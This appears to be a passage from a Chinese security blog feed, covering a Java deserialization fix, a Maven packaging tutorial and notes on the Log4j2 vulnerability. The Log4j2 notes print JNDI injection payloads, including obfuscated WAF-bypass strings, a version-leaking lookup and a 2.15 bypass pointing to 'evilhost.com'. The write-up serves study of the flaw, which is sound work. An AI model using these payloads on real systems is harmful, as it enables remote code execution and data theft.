class="line"></span><br><span class="line"><span class="keyword">import</span> xlh.serialVersionUID.Address;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;d:\\address.ser&quot;</span>);<span class="comment">//这样的话cc6.ser就不能使用了。</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HookObjectInputStream</span>(fin);</span><br><span class="line">            <span class="type">Address</span> <span class="variable">address</span> <span class="operator">=</span> (Address) ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            System.out.println(address);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception ex)&#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他利用fix思路不过多介绍。</p><p>突然想到了国赛java题的修复方案，是通过修改关键类中的serialVersionUID，<a href="https://www.cnblogs.com/xuxinstyle/p/11394358.html">serialVersionUID</a>可以理解为java序列化的标识。只有满足序列化后的serialVersionUID值和序列化前的值一样才可以成功反序列化。不然会报错<strong>InvalidClassException</strong></p><p><a href="http://www.code2sec.com/ji-yi-ci-javafan-xu-lie-hua-lou-dong-de-fa-xian-he-xiu-fu.html">一篇好文章</a></p><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>介绍了fix，然后在介绍一下漏洞挖掘的思路，只是自己的思路。。。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">一个类被加载到jvm中，是还没有进行初始化的，通常情况下可以通过<span class="keyword">new</span>、newInstance、Class.forName等方法来初始化。同时在初始化的过程中会调用类的静态方法/属性或者构造函数。所以经常有见到类写成如下形式：</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello Test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">这种时候通过Class.forName再初始化类的时候，jvm会自动调用其中的静态代码块，并输出。</span><br></pre></td></tr></table></figure><p>所以如果我们能控制<strong>Class.forName</strong>的值，并且我们重写一个恶意的静态方法就能够成功利用（这里和p师傅文章中的java安全慢谈一样）。</p><p>对于new、newInstance进行初始化类的时候会调用其无参的构造函数。至于利用思路，师傅们可以自己去思考。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">instance</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;static&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    instance()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">instance</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">instance</span>();</span><br><span class="line"><span class="comment">//        instance.class.newInstance();</span></span><br><span class="line"><span class="comment">//        Class.forName(&quot;instance&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java-maven打包学习</title>
      <link href="/2022/05/10/java-maven%E6%89%93%E5%8C%85%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/05/10/java-maven%E6%89%93%E5%8C%85%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="java-maven打包学习"><a href="#java-maven打包学习" class="headerlink" title="java-maven打包学习"></a>java-maven打包学习</h1><blockquote><p>之前提供spring写了一个shiro扫描key的工具，可惜简单的打包好像不行，因为有依赖包等等，因为我是提供spring框架提供的web服务去扫描的。今天就来填坑。。。。</p></blockquote><p>之前的打包一运行就报错。。非常难受。然后百度了一下原来是因为没有配置META-INF文件，所以在启动jar的时候找不到主类。而META-INF文件里面就配置了jar启动的主类和其他信息(Class-Path)。所以可以理解为启动jar的时候先去META-INF文件里面读配置然后执行java代码。你没有配置当然找不到主类咯。</p><p>然后就是来学习maven打包方式。</p><h3 id="maven命令"><a href="#maven命令" class="headerlink" title="maven命令"></a>maven命令</h3><p>1、mvn compile 编译,将Java 源程序编译成 class 字节码文件。</p><p>2、mvn test 测试，并生成测试报告</p><p>3、mvn clean 将以前编译得到的旧的 class 字节码文件删除</p><p>4、mvn pakage 打包,动态 web工程打 war包，Java工程打 jar 包。</p><p>5、mvn install 将项目生成 jar 包放在仓库中，以便别的模块调用</p><p>6、mvn clean install -Dmaven.test.skip=true  抛弃测试用例打包</p><h3 id="配置一"><a href="#配置一" class="headerlink" title="配置一"></a>配置一</h3><p>使用maven-jar-plugin和maven-dependency-plugin插件打包</p><p>通过<strong>mvn package</strong>指令打包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">addClasspath</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addClasspath</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">classpathPrefix</span>&gt;</span>lib/<span class="tag">&lt;/<span class="name">classpathPrefix</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.xxg.Main<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-dependency-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span>copy-dependencies<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">goal</span>&gt;</span>copy-dependencies<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;project.build.directory&#125;/lib<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>maven-jar-plugin用于生成META-INF/MANIFEST.MF文件的部分内容，</p><p><mainClass>com.xxg.Main</mainClass>指定MANIFEST.MF中的Main-Class，</p><p><addClasspath>true</addClasspath>会在MANIFEST.MF加上Class-Path项并配置依赖包，</p><p><classpathPrefix>lib/</classpathPrefix>指定依赖包所在目录。</p><h3 id="配置二"><a href="#配置二" class="headerlink" title="配置二"></a>配置二</h3><p>使用maven-assembly-plugin插件打包</p><p>通过<strong>mvn package assembly:single</strong>指令打包 </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.xxg.Main<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="配置三"><a href="#配置三" class="headerlink" title="配置三"></a>配置三</h3><p>使用maven-shade-plugin插件打包</p><p>通过<strong>mvn package</strong>指令打包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-shade-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span>  </span><br><span class="line">                    <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span>  </span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span>  </span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>shade<span class="tag">&lt;/<span class="name">goal</span>&gt;</span>  </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span>  </span><br><span class="line">                    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">                        <span class="tag">&lt;<span class="name">transformers</span>&gt;</span>  </span><br><span class="line">                            <span class="tag">&lt;<span class="name">transformer</span> <span class="attr">implementation</span>=<span class="string">&quot;org.apache.maven.plugins.shade.resource.ManifestResourceTransformer&quot;</span>&gt;</span>  </span><br><span class="line">                                <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.xxg.Main<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span>  </span><br><span class="line">                            <span class="tag">&lt;/<span class="name">transformer</span>&gt;</span>  </span><br><span class="line">                        <span class="tag">&lt;/<span class="name">transformers</span>&gt;</span>  </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p>这里自己喜欢第二个方法，如果记不住可以设置代码块。。</p><p><img src="/2022/05/10/java-maven%E6%89%93%E5%8C%85%E5%AD%A6%E4%B9%A0/image-20210818111820181.png" alt="image-20210818111820181"></p><blockquote><p>参考:</p><p><a href="https://blog.csdn.net/weixin_42248302/article/details/100886727">https://blog.csdn.net/weixin_42248302/article/details/100886727</a></p><p><a href="https://blog.csdn.net/sdrfengmi/article/details/87191944">https://blog.csdn.net/sdrfengmi/article/details/87191944</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java文件系统</title>
      <link href="/2022/03/19/Java%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
      <url>/2022/03/19/Java%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="47eba296a2319413459a3b32a1044f1842bf0ef054baa979c8bb19781c503cae"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> test image </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>闲聊log4j2</title>
      <link href="/2022/01/19/%E9%97%B2%E8%B0%88log4j2/"/>
      <url>/2022/01/19/%E9%97%B2%E8%B0%88log4j2/</url>
      
        <content type="html"><![CDATA[<h1 id="闲谈log4j2"><a href="#闲谈log4j2" class="headerlink" title="闲谈log4j2"></a>闲谈log4j2</h1><h2 id="log4j2爆炸漏洞"><a href="#log4j2爆炸漏洞" class="headerlink" title="log4j2爆炸漏洞"></a>log4j2爆炸漏洞</h2><p>简单的说一下最近这个log4j2漏洞吧，这个漏洞自己也跟了有一段时间了。第一次在学长那听到了这个漏洞，当时只是跟但了jndi注入点并没有发现漏洞的入口，也就是${jndi:ldap://127.0.0.1/exp}.一方面是没有想到这个功能，但是之后感觉官方文档里面说了<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html#JndiLookup">文档</a>，可能是自己语文水平不太好。(有点吃亏。。。</p><h2 id="挖掘新问题"><a href="#挖掘新问题" class="headerlink" title="挖掘新问题"></a>挖掘新问题</h2><p>然后就是复现漏洞。挖新的问题。当时第一时间感觉这个东西肯定有问题，第一时间就想到了dos。</p><p><img src="https://user-images.githubusercontent.com/63966847/146644571-d87566e9-ac55-44f7-aaf3-0a64beb97b01.png" alt="image-20211218215051277"></p><p>当时因为环境没有配置起就去睡觉了，当时已经是晚上的3点了。</p><p>说一下我当时发现的dos问题大致是因为数组长度我们可以控制造成溢出。第二天中午我大哥就提交了dos漏洞。之后就没有管了。</p><h2 id="绕过rc1"><a href="#绕过rc1" class="headerlink" title="绕过rc1"></a>绕过rc1</h2><p>在然后说一下绕过rc1吧这个东西虽然简单但是我调试了一下午，大概是因为对异常没有处理，也就是在catch中没有return，导致程序会继续执行。</p><p><img src="https://user-images.githubusercontent.com/63966847/146644576-d80164ab-1879-4e01-a50e-626f1c99bf5e.png" alt="Q`X GHE7UL3 IBYUAB0EFW"></p><p>所以绕过思路就直接让new url(name) 抛出异常就欧克。</p><p>tips:和bypass7u21差不多。。。</p><h2 id="修复问题"><a href="#修复问题" class="headerlink" title="修复问题"></a>修复问题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">今天看陈师傅写的文章，也就是修复log4j的坑。</span><br><span class="line">在漏洞报出来的时候修复的方法是：</span><br><span class="line"></span><br><span class="line">1.设置配置文件参数 log4j2.formatMsgNoLookups=true,</span><br><span class="line">2.vm启动环境参数 -Dlog4j2.formatMsgNolookups=true,</span><br><span class="line">3,设置系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为true</span><br><span class="line">而这样的修复是打破这个判断</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/63966847/146644579-6ed47eaf-8666-42ed-be31-7a01d83d860c.png" alt="image-20211215142114290"></p><p>认真看该代码其实在下面还有一个入口。</p><p><img src="https://user-images.githubusercontent.com/63966847/146644583-ac2f76eb-028d-4afb-8f72-e5848746b49c.png" alt="image-20211215142251448"></p><p>可以看到判断条件是 <strong>msg instanceof StringBuilderFormattable</strong></p><p>所以可以走第二个入口就绕过了log4j2.formatMsgNoLookups=true的判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log.printf(Level.ERROR,<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:2333&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&amp;mid=2456098698&amp;idx=1&amp;sn=8c66b476cb303bdf413337bc5c92e127&amp;chksm=803c6643b74bef55d1606a424e555ef09e27b8736928acdca027332453c6d9e4d7a11d7e589d&amp;mpshare=1&amp;scene=23&amp;srcid=1215Twk8iymC8x9gXD72dMTK&amp;sharer_sharetime=1639550097318&amp;sharer_shareid=20feca07eb3065d70e5194c2cdd097b3#rd">https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&amp;mid=2456098698&amp;idx=1&amp;sn=8c66b476cb303bdf413337bc5c92e127&amp;chksm=803c6643b74bef55d1606a424e555ef09e27b8736928acdca027332453c6d9e4d7a11d7e589d&amp;mpshare=1&amp;scene=23&amp;srcid=1215Twk8iymC8x9gXD72dMTK&amp;sharer_sharetime=1639550097318&amp;sharer_shareid=20feca07eb3065d70e5194c2cdd097b3#rd</a></p><p><a href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg">https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg</a></p></blockquote><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>信息泄露这个问题我在漏洞刚刚出来的那天晚上就想到了，只是对比rce，信息泄露就微不足道。因为log4j2支持很多协议 sys等等可以看到env等等这些的信息，然后通过dns带出来。</p><p>不过值得说一下其中有一个思路通过ResourceBundleLookup类去获得读取项目中后缀为properties的配置文件，其中就可能有username/password。当时我是看到了只是不知道这个方法是干啥子的也没有去百度。。。哭死了。</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483945&amp;idx=1&amp;sn=b15b68d95da83bb20f1b3496396f823a&amp;chksm=cff19125f88618338373a32f98be3d2a9497b464d6531658c2aa96f4872c23eed294441917b5&amp;mpshare=1&amp;scene=23&amp;srcid=1211aS0Tghr1agBnBRlwwGTw&amp;sharer_sharetime=1639232420884&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483945&amp;idx=1&amp;sn=b15b68d95da83bb20f1b3496396f823a&amp;chksm=cff19125f88618338373a32f98be3d2a9497b464d6531658c2aa96f4872c23eed294441917b5&amp;mpshare=1&amp;scene=23&amp;srcid=1211aS0Tghr1agBnBRlwwGTw&amp;sharer_sharetime=1639232420884&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd</a></p><p><a href="https://www.cnblogs.com/jona-test/p/11399218.html">https://www.cnblogs.com/jona-test/p/11399218.html</a></p><p>更新 2021/12/24</p><p>看了大哥4ra1n的文章 <a href="https://xz.aliyun.com/t/10659">https://xz.aliyun.com/t/10659</a></p><p>其中学习了dns（DNS协议是属于JNDI协议的） 可以带出数据 nc -lvup 通过udp接</p><p><img src="https://user-images.githubusercontent.com/63966847/147314294-222e4af5-98b3-4eac-863a-64316c775f91.png" alt="image"></p><p>然后就是回显的问题，通过报错来回显，其中port本该是int如果给它无法转int的字符串就会抛出这里的信息(触发RuntimeException)，并且ignoreExceptions配置为false。触发RuntimeException()</p><p>而NumberFormatException就是触发RuntimeException的子类。</p><p>${jndi:ldap://x.x.x.x:${java:version}/xxx}</p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>这个东西太多了，在tw一看就很多很多。一方面是因为一些协议可以返回输入的值比如：lower data</p><p>还有一个bypass思路是因为执行解析log4j2中的${}问题。简单的说也是将${::-x}解析成x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jn$&#123;::-d&#125;i:ldap://127.0.0.1:8880/&#125;</span><br></pre></td></tr></table></figure><h2 id="cve-dos"><a href="#cve-dos" class="headerlink" title="cve-dos"></a>cve-dos</h2><p>大哥成功获得apache的cve。<a href="https://xz.aliyun.com/t/10670">https://xz.aliyun.com/t/10670</a></p><p>简单的看了一下发现里面的思路和我不一样，大哥是想到了网络连接，也就可以存在一个网络超时的问题，而且log4j2支持递归解析。。所以就让他一直解析网络超时的ip…造成dos.</p><p>在这个cve通报中发现存在rce?简单的看了一下，我的理解是因为配置文件配置的这一次解析问题,如下配置中就有$${}这样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Appenders&gt;</span><br><span class="line">    &lt;Console name=&quot;STDOUT&quot; target=&quot;SYSTEM_OUT&quot;&gt;</span><br><span class="line">        &lt;PatternLayout&gt;</span><br><span class="line">            &lt;pattern&gt;%d %p %c&#123;1.&#125; [%t] $$&#123;ctx:loginId&#125; %m%n&lt;/pattern&gt;</span><br><span class="line">        &lt;/PatternLayout&gt;</span><br><span class="line">    &lt;/Console&gt;</span><br><span class="line">&lt;/Appenders&gt;</span><br></pre></td></tr></table></figure><p>而其中里面了ctx协议ContextMapLookup类，简单的说大概就是将我们解析的东西放到map里面然后在取出来。取出来之后在解析${xxxx}就造成了rce问题/dos问题。</p><h2 id="bypass-2-15"><a href="#bypass-2-15" class="headerlink" title="bypass 2.15"></a>bypass 2.15</h2><p>昨天在tw上看到了bypass 2.15版本,这个东西还没有具体去复现。不过看了一下exp大致懂了。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1#evilhost.com:1389/exp&#125;</span><br></pre></td></tr></table></figure><p>不过环境要求比较严格而且真实环境的rce可能比较可能。。。</p><p>2021/12/20更新</p><p>今天看到了大哥写的bypass 2.15 rce分析简单的记录一下 <a href="https://xz.aliyun.com/t/10689">https://xz.aliyun.com/t/10689</a></p><p>利用条件</p><p>1.开启lookup功能</p><p>2.macos系统</p><p>3.泛域名解析</p><p>4.本地存在gadget</p><p>该exp通过去绕过了ip限制并且可以解析远程恶意ip(macos系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1#evilhost.com:1389/exp&#125;</span><br></pre></td></tr></table></figure><p>然后去绕过ldap服务的限制。</p><p><img src="https://user-images.githubusercontent.com/63966847/146754506-bccfb16a-57e0-40d6-be17-36cbe67705a7.png" alt="image-20211220183446609"></p><p>正常情况是直接通过Reference去利用，不过这里不能使用Reference，所以就利用deserializeObject，其实就是bypass jdk8u191。满足本地存在gadget。只是需要把classname换成基本数据类型。去绕过<strong>if (!allowedClasses.contains(className))</strong></p><p>也其实就是我们在了ldap的时候的思路 <strong>LDAP服务攻击一般是先测Reference再测deserializeObject</strong></p><p><img src="https://user-images.githubusercontent.com/63966847/146754481-8d5aff45-fa12-4593-9165-ace4aa0257bd.png" alt="image-20211220183705875"></p><h2 id="CVE-2021-45105"><a href="#CVE-2021-45105" class="headerlink" title="CVE-2021-45105"></a>CVE-2021-45105</h2><p>这个漏洞我看了下没有看太懂，也就不这么介绍了反正大概介绍递归解析的问题。</p><figure class="highlight java"><table><tr><td 